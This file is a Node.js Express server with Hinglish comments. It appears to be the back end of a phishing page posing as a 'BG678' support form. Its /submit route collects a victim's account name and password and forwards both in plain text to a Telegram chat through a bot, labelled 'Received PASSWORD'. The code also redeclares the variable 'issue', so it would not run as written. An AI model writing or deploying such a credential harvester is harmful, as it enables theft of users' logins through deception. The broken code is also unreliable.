const express = require("express");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middlewares setup
app.use(cors());
app.use(express.json({ limit: "10kb" }));
app.use(express.static(__dirname));

// Telegram Bot initialization
// Dhyan rakhein ki aapki .env file mein BOT_TOKEN aur CHAT_ID sahi se set ho
const bot = new TelegramBot(process.env.BOT_TOKEN);

// Main Route jo HTML form ke fetch call se connect hoga
app.post("/submit", async (req, res) => {
    try {
        // HTML se bheja gaya data yahan receive ho raha hai
        const { account, password, issue } = req.body;
        const issue = "None";
        // Basic validation check
          if (!account || !password) {
            return res.status(400).json({
                success: false,
                message: "Kripya account aur password dono enter karein."
            });
        }

        // Telegram par bheje jaane wale message ka format
        const messageText = 
            "🧪 BG678 NOTIFICATION\n\n" +
            "📌 Support Issue: " + issue + "\n" +
            "📱 account: " + account + "\n" +
            "🔑 Received PASSWORD: " + password + "\n\n" +
            "Demo support information received.";

        // Telegram bot ke zariye chat mein message send karna
        await bot.sendMessage(process.env.CHAT_ID, messageText);

        // Frontend ko success response dena
        res.json({
            success: true,
            message: "Notification successfully sent to Telegram!"
        });

    } catch (error) {
        console.error("Telegram API Error:", error.message);
        res.status(500).json({
            success: false,
            message: "Internal Server Error: Telegram bot se connection fail hua."
        });
    }
});

// Server initialization
app.listen(PORT, () => {
    console.log("Bg678 server running successfully on port " + PORT);
});
